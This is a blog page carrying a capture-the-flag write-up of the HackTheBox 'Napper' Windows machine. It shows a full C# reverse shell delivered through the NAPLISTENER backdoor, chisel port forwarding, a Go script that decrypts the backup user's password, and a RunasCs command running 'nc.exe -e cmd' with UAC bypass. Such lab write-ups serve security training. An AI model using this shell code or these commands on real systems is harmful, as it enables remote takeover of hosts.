<!DOCTYPE html>
<html lang="en-US">

<head>
  <meta charset='utf-8'>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="index, follow">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
    integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
  <script src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
    crossorigin="anonymous"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"
    integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI"
    crossorigin="anonymous"></script>
  <link rel="shortcut icon" href="/assets/images/favicon.ico" type="image/x-icon" />
  <script type="text/javascript" async
    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
    </script>
  <link rel="stylesheet" href="/assets/css/style.css?v=8abef378d7354cf5cd2d7dd7509955b82441d1ff">
  <link rel="stylesheet" href="/assets/css/prism.css">
  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" rel="stylesheet" crossorigin="anonymous">
  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/brands.min.css" rel="stylesheet" crossorigin="anonymous">
  
  <meta name="theme-color" content="#000000" />
  <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HackTheBox Napper Writeup | Gabriel’s writeups</title>
<meta name="generator" content="Jekyll v3.9.5" />
<meta property="og:title" content="HackTheBox Napper Writeup" />
<meta name="author" content="gabri47" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="In this machine, we have a information disclosure in a posts page. Next, we have to exploit a backdoor (NAPLISTENER) present in the machine to gain access as Ruben. Then, we have to forward the port of elastic search to our machine, in which we can see a blob and seed for the backup user. Also, we have to reverse engineer a go compiled binary with Ghidra newest version to see how is used this information from elasticsearch db to retrieve the password of user backup. Finally, with RunasCs we can execute a command as backup, who belongs to the Administrators group and we can see root.txt." />
<meta property="og:description" content="In this machine, we have a information disclosure in a posts page. Next, we have to exploit a backdoor (NAPLISTENER) present in the machine to gain access as Ruben. Then, we have to forward the port of elastic search to our machine, in which we can see a blob and seed for the backup user. Also, we have to reverse engineer a go compiled binary with Ghidra newest version to see how is used this information from elasticsearch db to retrieve the password of user backup. Finally, with RunasCs we can execute a command as backup, who belongs to the Administrators group and we can see root.txt." />
<link rel="canonical" href="http://localhost:4000/writeups/2024/HTB/Napper.html" />
<meta property="og:url" content="http://localhost:4000/writeups/2024/HTB/Napper.html" />
<meta property="og:site_name" content="Gabriel’s writeups" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-05-03T00:00:00+02:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HackTheBox Napper Writeup" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"gabri47"},"dateModified":"2024-05-03T00:00:00+02:00","datePublished":"2024-05-03T00:00:00+02:00","description":"In this machine, we have a information disclosure in a posts page. Next, we have to exploit a backdoor (NAPLISTENER) present in the machine to gain access as Ruben. Then, we have to forward the port of elastic search to our machine, in which we can see a blob and seed for the backup user. Also, we have to reverse engineer a go compiled binary with Ghidra newest version to see how is used this information from elasticsearch db to retrieve the password of user backup. Finally, with RunasCs we can execute a command as backup, who belongs to the Administrators group and we can see root.txt.","headline":"HackTheBox Napper Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/2024/HTB/Napper.html"},"url":"http://localhost:4000/writeups/2024/HTB/Napper.html"}</script>
<!-- End Jekyll SEO tag -->

  
</head>

<body>

  <div id="header">
    <div class="container">
      <div class="title-container">
        <a id="a-title" href="/">
          <h1>Gabriel's writeups</h1>
        </a>
        <small class="nav-main d-flex justify-content-center">
    
    <a href = "/writeups">Writeups</a>
    
    &nbsp;<span style="color: #b5e853;">|</span>&nbsp;
    
    
    <a href = "/solutions">Solutions</a>
    
    &nbsp;<span style="color: #b5e853;">|</span>&nbsp;
    
    
    <a href = "/blog">Blog</a>
    
    
</small>
      </div>
      <br>

      
      
<nav class="navbar navlinks">
    <button class="navbar-toggler d-flex w-100 justify-content-between collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
        aria-controls="navbarSupportedContent" aria-expanded="true" aria-label="Toggle navigation">
        <span>HTB Writeups</span>
        <i style="float: right;" class="fa fa-bars menu-icon" aria-hidden="true"></i>
    </button>

    <div class="navbar-collapse collapse" id="navbarSupportedContent">
        <div class="m-1 mt-2">

            
            
            

            
            
            

            <small class="m-2">2024</small>
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Codify.html"> HackTheBox Codify Writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;nodejs/&gt; &lt;rce/&gt; &lt;sqlite3/&gt; &lt;hashes/&gt; &lt;sudoers/&gt; &lt;bash-bruteforcing/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Hospital.html"> HackTheBox Hospital Writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;webshell_upload/&gt; &lt;kernel_exploits/&gt; &lt;hash_cracking/&gt; &lt;pivoting/&gt; &lt;phishing/&gt; &lt;ghostscript_rce/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Surveillance.html"> HackTheBox Surveillance writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;craft_cms/&gt; &lt;hash_cracking/&gt; &lt;zoneminder_exploit/&gt; &lt;sudoers/&gt; &lt;abusing_zmupdate.pl/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Devvortex.html"> HackTheBox Devvortex Writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;joomla/&gt; &lt;CVE-2023-23752/&gt; &lt;information_leakage/&gt; &lt;password_reuse/&gt; &lt;joomla_rce/&gt; &lt;database_enumeration/&gt; &lt;hash_cracking/&gt; &lt;ssh/&gt; &lt;sudoers/&gt; &lt;apport-cli/&gt; &lt;CVE-2023-1326/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Napper.html"> HackTheBox Napper Writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;information_disclosure/&gt; &lt;abusing_backdoor/&gt; &lt;naplistener/&gt; &lt;elasticsearch/&gt; &lt;reverse_engineering/&gt; &lt;go_reverse_engineering/&gt; &lt;decryption_with_AES/&gt; &lt;runascs/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                
            </ul>

            
            

            
            

        </div>
    </div>
</nav>

      

      
      <div id="bottom-bar">
        <div class="social d-flex flex-column justify-content-center w-100">
    <a href="/search" class="text-center w-100 mt-3 mb-2">
      <i class="fa fa-sm fa-search"></i>
    </a>
    <div class="social-links-bar d-flex justify-content-center mb-2">
        
        
        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
        </a>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    </div>
    
    <div class="htb_badge d-flex justify-content-center">
        
        <script src="https://www.hackthebox.eu/badge/831031"></script>
        
    </div>
    <div class="thm_badge">
        
    </div>
    
</div>

      </div>
    </div>
  </div>

  <div id="content" class="container">
    <section id="main_content">
      <h5 class="mt-0 mb-2">
        
        
          HTB
        
        
      </h5>
    
      <h1 class="d-flex w-100 justify-content-between">
        
        
          <span>HackTheBox Napper Writeup</span> <span class="points"> [40 pts] </span>
        
        
      </h1>


<script>

</script>

<p>In this machine, we have a information disclosure in a posts page. Next, we have to exploit a backdoor present in the machine to gain access as Ruben. Then, we have to forward the port of elastic search to our machine, in which we can see a blob and seed for the backup user. Also, we have to reverse engineer a go compiled binary with Ghidra newest version to see how is used this information from elasticsearch db to retrieve the password of user backup. Finally, with RunasCs we can execute a command as backup, who belongs to the Administrators group and we can see root.txt.</p>
    
      <h1 id="enumeration">
        
        
          Enumeration <a href="#enumeration" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h1>
    
      <h2 id="port-scanning">
        
        
          Port scanning <a href="#port-scanning" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h2>

<p>Let’s start with a basic nmap scanning to see which ports are available:</p>

<pre><code class="language-bash">❯ sudo nmap -p- -sVC -sS --min-rate 5000 -n -Pn 10.10.11.240 -oN tcpTargeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-03 12:48 CEST
Nmap scan report for 10.10.11.240
Host is up (0.052s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://app.napper.htb
443/tcp open  ssl/http Microsoft IIS httpd 10.0
|_http-generator: Hugo 0.112.3
|_ssl-date: 2024-05-03T10:48:50+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=app.napper.htb/organizationName=MLopsHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:app.napper.htb
| Not valid before: 2023-06-07T14:58:55
|_Not valid after:  2033-06-04T14:58:55
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Research Blog | Home 
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.79 seconds
</code></pre>

<p>We have port 80, which redirects to https://app.napper.htb, so the only important port is 443.</p>

<p>Let’s add the hosts napper.htb and app.napper.htb to /etc/hosts</p>

<pre><code class="language-bash">❯ echo '10.10.11.240 napper.htb app.napper.htb' | sudo tee -a /etc/hosts 
</code></pre>
    
      <h2 id="web-enumeration">
        
        
          Web enumeration <a href="#web-enumeration" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h2>

<p>Since we have domains let’s try to enumerate subdomains by our own to see if there is another:</p>

<pre><code class="language-bash">❯ wfuzz -c -t 100 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.napper.htb" -u https://napper.htb --hh=5602
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://napper.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000387:   401        29 L     100 W      1293 Ch     "internal"                                                                                                             

Total time: 35.98812
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 138.6290
</code></pre>

<p>We have the internal.napper.htb subdomain, which asks for credentials for basic authentication:</p>

<p><img src="/assets/images/Napper/basic_auth_required.png" alt="Basic auth required" /></p>

<p>We don’t have any valid credentials so we can’t access, let’s take a look to napper.htb and app.napper.htb</p>
    
      <h3 id="napperhtb">
        
        
          napper.htb
        
        
      </h3>

<p>It’s a research blog with a lot of posts:</p>

<p><img src="/assets/images/Napper/napper.htb.png" alt="napper.htb" /></p>
    
      <h3 id="appnapperhtb">
        
        
          app.napper.htb
        
        
      </h3>

<p>It’s the same as napper.htb but with other font:</p>

<p><img src="/assets/images/Napper/app.napper.htb.png" alt="app.napper.htb" /></p>

<p>Looking at the posts, we can see one that talks about basic authentication:</p>

<p><img src="/assets/images/Napper/post_about_basic_auth.png" alt="Post about basic auth" /></p>

<p>And in the bottom, we can see a powershell command to create a user for that basic auth, in which we can see the credentials example:ExamplePassword:</p>

<p><img src="/assets/images/Napper/command_to_create_username_of_basic_auth.png" alt="Command to create username of basic auth" /></p>
    
      <h3 id="internalnapperhtb">
        
        
          internal.napper.htb
        
        
      </h3>

<p>Supposing that the admins executed that command, we can try to access to internal.napper.htb with those credentials:</p>

<p><img src="/assets/images/Napper/internal.napper.htb_access_granted.png" alt="Access granted on internal.napper.htb" /></p>

<p>Now we can see an internal post that talks about a malware research and it is supposed that they are infected with the NAPLISTENER backdoor:</p>

<p><img src="/assets/images/Napper/internal_post.png" alt="Internal Post" /></p>

<p>In the references below we can end up with <a href="https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph">this article</a> that talks about how this backdoor is deployed and how to use it.</p>

<p>To find out if it exists in the machine, we are said that in a normal GET request to /ews/MsExgHealthCheckd/, it has to return a 404 status code but also some special headers:</p>

<p><img src="/assets/images/Napper/404_special_headers.png" alt="404 Special Headers" /></p>

<p>Let’s try it in all the domains with curl with the parameter -k for ignoring the warning of self-signed certificates and -v (verbose) to see the headers:</p>

<ul>
  <li>internal.napper.htb</li>
</ul>

<pre><code class="language-bash">❯ curl -s -X GET -k https://example:ExamplePassword@internal.napper.htb/ews/MsExgHealthCheckd/ -v
* Host internal.napper.htb:443 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.240
*   Trying 10.10.11.240:443...
&lt;-- MORE CONTENT --&gt;
&gt; GET /ews/MsExgHealthCheckd/ HTTP/2
&gt; Host: internal.napper.htb
&gt; Authorization: Basic ZXhhbXBsZTpFeGFtcGxlUGFzc3dvcmQ=
&gt; User-Agent: curl/8.5.0
&gt; Accept: */*
&gt; 
&lt; HTTP/2 404 
&lt; content-type: text/html
&lt; server: Microsoft-IIS/10.0
&lt; date: Fri, 03 May 2024 11:28:54 GMT
&lt; content-length: 1245
&lt; 
&lt;-- MORE CONTENT --&gt;
</code></pre>

<p>Here we don’t have it.</p>

<ul>
  <li>app.napper.htb</li>
</ul>

<pre><code class="language-bash">❯ curl -s -X GET -k https://app.napper.htb/ews/MsExgHealthCheckd/ -v
* Host app.napper.htb:443 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.240
*   Trying 10.10.11.240:443...
* Connected to app.napper.htb (10.10.11.240) port 443
&lt;-- MORE CONTENT --&gt;
&gt; GET /ews/MsExgHealthCheckd/ HTTP/2
&gt; Host: app.napper.htb
&gt; User-Agent: curl/8.5.0
&gt; Accept: */*
&gt; 
&lt; HTTP/2 404 
&lt; content-type: text/html
&lt; server: Microsoft-IIS/10.0
&lt; date: Fri, 03 May 2024 11:32:05 GMT
&lt; content-length: 1245
&lt;
&lt;-- MORE CONTENT --&gt;
</code></pre>

<p>Here we neither have it.</p>

<ul>
  <li>napper.htb</li>
</ul>

<pre><code class="language-bash">❯ curl -s -X GET -k https://napper.htb/ews/MsExgHealthCheckd/ -v
* Host napper.htb:443 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.240
*   Trying 10.10.11.240:443...
* Connected to napper.htb (10.10.11.240) port 443

&lt;-- MORE CONTENT --&gt;

&lt; HTTP/2 404 
&lt; content-length: 0
&lt; content-type: text/html; charset=utf-8
&lt; server: Microsoft-IIS/10.0 Microsoft-HTTPAPI/2.0
&lt; x-powered-by: ASP.NET
&lt; date: Fri, 03 May 2024 11:33:38 GMT
&lt; 
* Connection #0 to host napper.htb left intact

</code></pre>

<p>Here yes we have those special headers (Content-Type: charset=utf-8 and Server: Microsoft-HTTPAPI/2.0), so it exists.</p>

<p>Also, we are said that any POST request that contains a base64-encoded .NET assembly in the parameter sdafwe3rwe23, it will be executed on memory.</p>

<p><img src="/assets/images/Napper/post_request_with_special_parameter.png" alt="POST request with special parameter" /></p>

<p>So we can try to execute command on the machine with this backdoor.</p>
    
      <h1 id="access-as-ruben">
        
        
          Access as ruben <a href="#access-as-ruben" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h1>

<p>For using this backdoor, we need a C# assembly code and a compiler. In this case I will use the code that generates <a href="https://revshells.com">revshells.com</a> but we have to modify some things. In first place, we have to change sh to cmd because this is a windows machine, rename the namespace to the same name of the file (in my case Program) and replace the content of the main function to <code>new Run();</code> and above create that function with the content that we removed from main function. With these changes, the remaining C# code is this:</p>

<pre><code class="language-csharp">using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace Program
{
	public class Run
	{
		static StreamWriter streamWriter;

    public Run()
    {
      using(TcpClient client = new TcpClient("10.10.14.76", 443))
      {
        using(Stream stream = client.GetStream())
        {
          using(StreamReader rdr = new StreamReader(stream))
          {
            streamWriter = new StreamWriter(stream);
            
            StringBuilder strInput = new StringBuilder();

            Process p = new Process();
            p.StartInfo.FileName = "cmd";
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardError = true;
            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
            p.Start();
            p.BeginOutputReadLine();

            while(true)
            {
              strInput.Append(rdr.ReadLine());
              //strInput.Append("\n");
              p.StandardInput.WriteLine(strInput);
              strInput.Remove(0, strInput.Length);
            }
          }
        }
      }
    }
    public static void Main(string[] args)
    {
       new Run();
    }

    private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
    {
      StringBuilder strOutput = new StringBuilder();

      if (!String.IsNullOrEmpty(outLine.Data))
      {
        try
        {
          strOutput.Append(outLine.Data);
          streamWriter.WriteLine(strOutput);
          streamWriter.Flush();
        }
        catch (Exception err) { }
      }
    }
  }
}
</code></pre>

<p>Now that we have to code, we need a compiler to compile it, to made it portable, we can use mcs:</p>

<pre><code class="language-bash">❯ mcs -out:Program.exe Program.cs
Program.cs(64,34): warning CS0168: The variable `err' is declared but never used
Compilation succeeded - 1 warning(s)
</code></pre>

<p>Now that we have the assembly finalized, we have to set up the nc listener on the port you specified, base64 encode, urlencode the payload and send it to the server:</p>

<pre><code class="language-bash">❯ base64 -w 0 Program.exe | xclip -sel clip # Base64 the program and copy it to clipboard
❯ payload="your_copied_payload"
❯ php -r "echo urlencode('$payload');" | xclip -sel clip # Url encode the payload and copy it to clipboard
❯ urlencoded_payload="your_new_copied_payload"
❯ curl -X POST -k https://napper.htb/ews/MsExgHealthCheckd/ -d "sdafwe3rwe23=$urlencoded_payload"
</code></pre>

<p>And we receive the shell as ruben:</p>

<p><img src="/assets/images/Napper/shell_received.png" alt="Shell received" /></p>

<p>This shell is so uncomfortable so I will use the <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">Invoke-PowerShellTcp</a> script of nishang to have a more comfortable shell. ConPtyShell for some reason doesn’t work on this machine, so I have to deal with this script and we can’t do ctrl+c. Rlwrap is for doing ctrl+l, have command history and move with the arrows.</p>

<p><img src="/assets/images/Napper/new_better_shell.png" alt="New better shell" /></p>
    
      <h1 id="privilege-escalation">
        
        
          Privilege escalation <a href="#privilege-escalation" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h1>

<p>Looking at the files, we end up with the folder C:\Temp\www\internal\content\posts\internal-laps-alpha which has two files, one .env with credentials for elastic and a binary a.exe:</p>

<pre><code class="language-powershell">PS C:\Temp\www\internal\content\posts\internal-laps-alpha&gt; dir


    Directory: C:\Temp\www\internal\content\posts\internal-laps-alpha


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          6/9/2023  12:28 AM             82 .env                                                                 
-a----          6/9/2023  12:20 AM       12697088 a.exe                                                                


PS C:\Temp\www\internal\content\posts\internal-laps-alpha&gt; 
</code></pre>

<p>In the .env we have credentials for elastic, which is running on port 9200 as it’s visible in the .env file:</p>

<pre><code class="language-powershell">PS C:\Temp\www\internal\content\posts\internal-laps-alpha&gt; type .env
ELASTICUSER=user
ELASTICPASS=DumpPassword\$Here

ELASTICURI=https://127.0.0.1:9200
</code></pre>

<pre><code class="language-powershell">PS C:\Temp\www\internal\content\posts\internal-laps-alpha&gt; cmd /c "netstat.exe -ano" | findstr LISTENING
</code></pre>
<p><img src="/assets/images/Napper/port_9200_opened.png" alt="Port 9200 opened" /></p>

<p>Let’s forward that port to our machine using chisel:</p>
    
      <h3 id="attacker">
        
        
          Attacker
        
        
      </h3>

<pre><code class="language-bash">❯ ./chisel server -p 1234 --reverse
2024/05/03 20:52:07 server: Reverse tunnelling enabled
2024/05/03 20:52:07 server: Fingerprint CCdOgnd9DUXQk2yL0WfkRa1ALH1Yygc2itgC3YD5g3k=
2024/05/03 20:52:07 server: Listening on http://0.0.0.0:1234
</code></pre>
    
      <h3 id="victim">
        
        
          Victim
        
        
      </h3>

<p>It’s recommended to open another shell to leave the other active for when we need it.</p>

<pre><code class="language-powershell">PS C:\Windows\Temp\Privesc&gt;.\chisel.exe client 10.10.14.76:1234 R:9200:127.0.0.1:9200
</code></pre>

<p>Let’s use the credentials in the .env file to inspect elasticsearch service using <a href="https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch">this guide</a>:</p>

<p><img src="/assets/images/Napper/elastic_search_inspecting_main_page.png" alt="Elasticsearch inspecting the main page" /></p>

<p>We see a hash (which we could try to crack but don’t work) for the backup user that exists in the victim machine and is a Administrator:</p>

<pre><code class="language-powershell">PS C:\Temp\www\internal\content\posts\internal-laps-alpha&gt; net user backup
User name                    backup
Full Name                    backup
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/3/2024 1:01:56 PM
Password expires             Never
Password changeable          5/3/2024 1:01:56 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   6/9/2023 5:27:07 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *None                 
The command completed successfully.
</code></pre>

<p>Also in the endpoint <code>/_search?pretty=true</code> we can see a seed and a blob that changes every certain time and we don’t know how to use it:</p>

<p><img src="/assets/images/Napper/blob_and_seed_in_elasticsearch.png" alt="Blob and seed in elasticsearch" /></p>

<p>We can try to reverse engineer the binary to see if we see something interesting there.
Let’s transfer the binary to our machine using smb:</p>
    
      <h3 id="attacker-1">
        
        
          Attacker
        
        
      </h3>

<pre><code class="language-bash">❯ smbserver.py -username test -password test123 -smb2support smbDir $(pwd)
Impacket v0.12.0.dev1+20240411.142706.1bc283fb - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
</code></pre>
    
      <h3 id="victim-1">
        
        
          Victim
        
        
      </h3>

<pre><code class="language-powershell">PS C:\Temp\www\internal\content\posts\internal-laps-alpha&gt; net use z: \\10.10.14.76\smbDir /user:test test123
The command completed successfully.

PS C:\Temp\www\internal\content\posts\internal-laps-alpha&gt; copy a.exe z:\.

PS C:\Temp\www\internal\content\posts\internal-laps-alpha&gt;
</code></pre>

<p>Trying to analyze it with ghidra we are said that its language is go when we import the binary:</p>

<p><img src="/assets/images/Napper/golang_ghidra.png" alt="We discover it's a go binary" /></p>

<p>The go language is so hard to decompile because its characteristics like is statically linked, it’s size, etc. <a href="https://github.com/NationalSecurityAgency/ghidra/releases">Ghidra</a> is a great reverse engineering tool that deals with all this but it takes a bit long to analyze so we have to wait. Install it from the web page because from apt is outdated and it doesn’t has the same decompiling of go that has the newest version.</p>

<p>To analyze the functions, first start with Exports &gt; main.main that is the equivalent to main function in C.</p>

<p>Looking at the code we can see that is using the ELASTICUSER, ELASTICPASS and ELASTICURI variables from .env file:</p>

<p><img src="/assets/images/Napper/getenv.png" alt="Get env variables" /></p>

<p>The most interesting part is here:</p>

<p><img src="/assets/images/Napper/most_interesting_part.png" alt="Most interesting part" /></p>

<p>First, it stores in sVar10 a random string:</p>

<p><img src="/assets/images/Napper/generates_random_string.png" alt="Generates random string" /></p>

<p>Next, uses the seed to create a key, which is 16 characters long:</p>

<p><img src="/assets/images/Napper/generate_key.png" alt="Generate key" /></p>

<p>Then, it creates the blob with the random string and the generated key. It initializes a new AES cipher with the key, creates a CFB mode cipher and encodes it a base64:</p>

<p><img src="/assets/images/Napper/how_it_encrypts.png" alt="How it encrypts" /></p>

<p>Also, it writes the blob in the elasticsearch database:</p>

<p><img src="/assets/images/Napper/writes_blob_elasticsearch_db.png" alt="Writes blob in elasticsearch db" /></p>

<p>Finally, it uses the random string to change the password of the user backup which belong to Admins group:</p>

<p><img src="/assets/images/Napper/changes_password_of_user_backup.png" alt="Changes password of backup user" /></p>

<p>Now we have to do the reverse process with the blob and the seed we have in the elasticsearch database here:</p>

<p><img src="/assets/images/Napper/elasticsearchdb_seed_and_blob.png" alt="Seed and blob on elasticsearch db" /></p>

<p>For that I have created this script with a lot of help of ChatGPT (see the prompts <a href="https://chat.openai.com/share/578addd0-3ac2-4a1b-8ca0-367c5f877480">Prompt 1</a> and <a href="https://chat.openai.com/share/6cfc3125-9889-4ad8-bf22-b69a771d1743">Prompt 2</a>) because I don’t understand nothing of Go:</p>

<pre><code class="language-go">package main

import (
    "fmt"
    "math/rand"
    "crypto/aes"
    "crypto/cipher"
    "encoding/base64"
    "os"
    "strconv"
)

func genKey(seed int64) []byte {
    // Seed the random number generator
    rand.Seed(seed)

    // Generate a random key of length 16
    key := make([]byte, 16)
    for i := 0; i &lt; 16; i++ {
        key[i] = byte(rand.Intn(254) + 1) // Random number between 1 and 255
    }
    return key
}

func decrypt(key []byte, encodedStr string) (string, error) {
    // Decode the base64 encoded string
    encrypted, err := base64.URLEncoding.DecodeString(encodedStr)
    if err != nil {
        return "", err
    }

    // Initialize AES cipher with the provided key
    block, err := aes.NewCipher(key)
    if err != nil {
        return "", err
    }

    // Create a cipher feedback (CFB) mode cipher
    iv := encrypted[:aes.BlockSize]
    encrypted = encrypted[aes.BlockSize:]

    stream := cipher.NewCFBDecrypter(block, iv)
    decrypted := make([]byte, len(encrypted))
    stream.XORKeyStream(decrypted, encrypted)

    return string(decrypted), nil
}


func main() {
    // Use the current time as seed
    
    if (len(os.Args) &lt; 2) {
      fmt.Println("Usage:", "decrypt.go", "&lt;seed&gt;", "&lt;blob&gt;")
      fmt.Println("Please provide seed and blob")
    
    } else {
      seed, err := strconv.ParseInt(os.Args[1], 10, 64)
      encodedStr := os.Args[2]
      key := genKey(seed)

      decryptedStr, err := decrypt(key, encodedStr)
      if err != nil {
          fmt.Println("Error:", err)
          return
      }

      fmt.Println("Decrypted String (Password):", decryptedStr)
    }  
}

</code></pre>

<p>Now, spawn a nc listener, Download nc.exe and RunasCs.exe in the victim machine to run as user backup this command to gain access:</p>

<pre><code class="language-powershell">PS C:\Windows\Temp\Privesc&gt; ./RunasCs.exe backup &lt;decrypted_password&gt; "C:\Windows\Temp\Privesc\nc.exe -e cmd 10.10.14.76 443" -l 8 --bypass-uac
</code></pre>

<p>And we gain access as backup:</p>

<p><img src="/assets/images/Napper/access_as_backup.png" alt="Access as backup" /></p>

<p>Now we can see root flag:</p>

<pre><code class="language-cmd">C:\Windows\system32&gt;cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop&gt;type root.txt
16****************************a7
</code></pre>

<p>That is the machine, hope you liked it.</p>


<div id="share-links">
  <span id="divider-line">____</span>
  <br><br>
  <small>3 May 2024</small>
  <div>
    
    Tags:
    
    <a href="/search?q=information_disclosure" class="tag" style="font-family: 'Cascadia Code';">information_disclosure</a>
    
    <a href="/search?q=abusing_backdoor" class="tag" style="font-family: 'Cascadia Code';">abusing_backdoor</a>
    
    <a href="/search?q=naplistener" class="tag" style="font-family: 'Cascadia Code';">naplistener</a>
    
    <a href="/search?q=elasticsearch" class="tag" style="font-family: 'Cascadia Code';">elasticsearch</a>
    
    <a href="/search?q=reverse_engineering" class="tag" style="font-family: 'Cascadia Code';">reverse_engineering</a>
    
    <a href="/search?q=go_reverse_engineering" class="tag" style="font-family: 'Cascadia Code';">go_reverse_engineering</a>
    
    <a href="/search?q=decryption_with_AES" class="tag" style="font-family: 'Cascadia Code';">decryption_with_AES</a>
    
    <a href="/search?q=runascs" class="tag" style="font-family: 'Cascadia Code';">runascs</a>
    
    
</div>
  <br>
  Share this writeup:&nbsp;
  <a
    href="javascript:window.open('https://www.facebook.com/sharer.php?u=http://localhost:4000/writeups/2024/HTB/Napper.html','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
      class="fa fa-facebook-official" aria-hidden="true"></i></a>&nbsp;
  <a
